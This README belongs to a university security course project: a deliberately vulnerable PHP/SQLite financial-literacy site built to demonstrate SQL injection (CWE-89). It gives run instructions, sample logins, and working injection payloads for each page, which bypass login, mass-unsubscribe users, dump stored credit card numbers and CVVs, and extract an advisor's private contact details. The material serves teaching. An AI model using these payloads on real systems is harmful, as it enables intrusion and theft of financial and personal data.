# CPSC525_FinalProject

MEMBERS:
Aaron St. Omer - 30144511
Saad Abdullah - 30142511
Sam Laurie - 30056429
Caio Araujo - 30148726
Jerrit Smith - 30117474

Final project for CPSC 525, showcasing CWE 89 - Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

DESCRIPTION:
This project is a financial literacy website that lets users book appointments with advisors, purchase courses and sign up for newsletters
On each page, there is a vulnerability that can be exploited using an SQL injection attack
Our code has vulnerabilities which can be exploited by just typing in commands, thus we did not need a exploit script
The languages used were PHP and SQL for interacting with the sqlite database as well as HTML and CSS for styling


HOW TO COMPILE/RUN THE CODE:
To start the program navigate to the directory containing the program files
Then to start the program enter: php -S 127.0.0.1:8000  
And CTRL + click the link that appears in the terminal which will open the local hosted website  

Two example login users (you can create your own too using the sign up on the login page):
user: alice99
password: password123
user: bob_182
password: hunter2

EXPLOITS - each SQL injection code can be used on a specific page to exploit a vulnerability:
Just copy and paste the exploit code into the specified field
SQL Injection Commands:

    Login page - password field (index.php) - Allows the attacker to login by only knowing a valid username and without knowing the correct password:
    ' OR 1=1--

    Unsubscribe page - username field (unsubscribe.php) - Removes all users from the newletter and mailing list:
    ' OR 1=1--

    Transactions page - ccnum field (transactions.php) - Displays the credit card information of all users who have made transcations:
    '|| (SELECT group_concat(course || ' - ' || ccnum || ' - ' || cvv || ' - ' || expDate, '; ') FROM transactions) ||'

    Appointments page - notes field (appt_selection.php) - Displays the private info of a specified advisor:
    NOTE: change advisor@example.com to an actual advisor email shown on the page
    '|| (SELECT phonenumber || ' - ' || address FROM advisor WHERE email = 'advisor@example.com') ||'


